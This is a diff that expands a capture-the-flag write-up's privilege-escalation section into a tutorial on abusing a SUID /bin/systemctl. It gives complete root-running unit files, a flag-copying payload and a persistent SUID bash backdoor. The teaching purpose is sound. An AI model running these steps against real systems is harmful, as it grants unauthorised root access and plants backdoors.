@@ -48,33 +48,100 @@ The lesson is the empty first scan: "no ports" ≠ "no box". Retry with -Pn befo
 
 ## 3. Privilege escalation (root)
 
-1. **Did:** SUID sweep — `find / -type f -perm -04000 -ls 2>/dev/null`; scanned for
-   `-rwsr-xr-x root root` lines.
-   **Result:** **/bin/systemctl** with the SUID bit — the only non-standard entry in the list.
+### 3.1 Finding the lever
 
-2. **Did:** wrote a unit file and ran it through the SUID binary:
-   ```
-   cat > /tmp/root.service <<'EOF'
-   [Service]
-   Type=oneshot
-   ExecStart=/bin/sh -c "id > /tmp/proof"
-   [Install]
-   WantedBy=multi-user.target
-   EOF
-   /bin/systemctl link /tmp/root.service
-   /bin/systemctl start root.service
-   cat /tmp/proof        → uid=0(root)
-   ```
-   **Why it works:** systemctl runs as root (SUID), and it follows the instructions in the unit
-   file — so ExecStart executes as root. The exploit is a text file.
+`find / -type f -perm -04000 -ls 2>/dev/null` lists every binary with the SUID bit. SUID means:
+**whoever runs this file runs it as its owner (root), temporarily.** That is fine for `sudo`,
+`passwd`, `su` — they are built to be safe. The question for every SUID binary is:
+*can I make this run MY command as root?*
 
-3. **Did:** second unit (`flag.service`) with
-   `ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/r && chmod 644 /tmp/r"` → `cat /tmp/r`.
-   **Result:** root flag.
+Scanning the `-rwsr-xr-x root root` lines, exactly one binary stands out: **/bin/systemctl** —
+the systemd service manager. It normally is not SUID. Here it is.
 
-Key concept: **a root service is not a root shell.** `whoami` stays www-data forever; the service
-is a detached root process. The service gives you root *execution*, and you choose what to do
-with it (read the flag, drop a SUID shell, etc.).
+### 3.2 The idea, in one sentence
+
+systemctl executes unit files ("recipes" for services), each recipe says which command to run
+(`ExecStart`), and this copy of systemctl runs as root — so whatever is written in ExecStart
+runs as root. **The exploit is a text file.**
+
+### 3.3 Proof step — make root write down that it ran
+
+1. **Write the recipe:**
+
+```
+cat > /tmp/root.service <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/proof"
+[Install]
+WantedBy=multi-user.target
+EOF
+```
+
+   - `cat > /tmp/root.service <<'EOF' ... EOF` — a heredoc: everything between the two `EOF`
+     markers is written into the file. Quoted `'EOF'` = don't interpret the contents.
+   - `[Service]` — section header: "what follows describes how the service runs."
+   - `Type=oneshot` — run the command once, then exit (not a long-lived daemon).
+   - `ExecStart=` — **the payload.** This line runs as root. Here: `id > /tmp/proof` = "write
+     who-you-are into a file."
+   - `[Install]` / `WantedBy=` — boilerplate systemd wants; the target name doesn't matter here.
+
+2. **Register the unit:**
+
+```
+/bin/systemctl link /tmp/root.service
+```
+
+   `link` = "systemd, learn this unit file" — it creates the symlink
+   `/etc/systemd/system/root.service -> /tmp/root.service`.
+
+3. **Run it:**
+
+```
+/bin/systemctl start root.service
+```
+
+4. **Verify:**
+
+```
+cat /tmp/proof
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+`id` ran **as root** and wrote its answer. Root execution proven.
+
+### 3.4 The confusing part — why `whoami` still says www-data
+
+The service is a **detached background process**: it ran as root, did its one thing, and died.
+It never touches your terminal. Your shell is still www-data and always will be — you never
+"become" root interactively this way.
+
+So root execution is something you *use*, through payloads that **move things** (copy files,
+chmod things), not interactive shells. That is why the proof step exists: first prove
+ExecStart runs as root, then decide what root should do for you.
+
+### 3.5 Finisher — turn root execution into the flag
+
+Same recipe, new payload, **new file name** (root.service already ran and is cached by systemd;
+a fresh name avoids fighting a daemon reload):
+
+```
+cat > /tmp/flag.service <<'EOF'
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/r && chmod 644 /tmp/r"
+[Install]
+WantedBy=multi-user.target
+EOF
+/bin/systemctl link /tmp/flag.service
+/bin/systemctl start flag.service
+cat /tmp/r        → root flag
+```
+
+Root reads the flag, copies it where www-data can read it, and makes it readable.
+
+Alternative finisher: `ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash && chmod +s /tmp/bash"`,
+then `/tmp/bash -p` — a SUID root shell you can actually type into.
 
 ## 4. Misses and dead ends
 
